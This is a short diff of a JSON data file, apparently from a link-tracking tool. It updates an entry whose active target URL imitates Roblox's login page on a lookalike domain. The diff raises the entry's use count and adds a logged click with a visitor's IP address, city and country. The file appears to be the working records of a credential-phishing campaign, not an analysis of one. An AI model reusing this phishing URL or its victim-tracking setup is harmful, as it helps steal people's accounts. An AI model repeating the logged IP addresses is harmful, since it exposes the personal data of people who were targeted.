@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 262,
+    "useCount": 263,
     "createdBy": "admin",
     "clicks": [
       {
@@ -2206,6 +2206,14 @@
         "ip": "172.56.219.207",
         "country": "United States",
         "city": "Philadelphia",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1777000965779,
+        "ip": "77.111.246.46",
+        "country": "United States",
+        "city": "Washington",
         "flag": "🇺🇸",
         "countryCode": "US"
       }
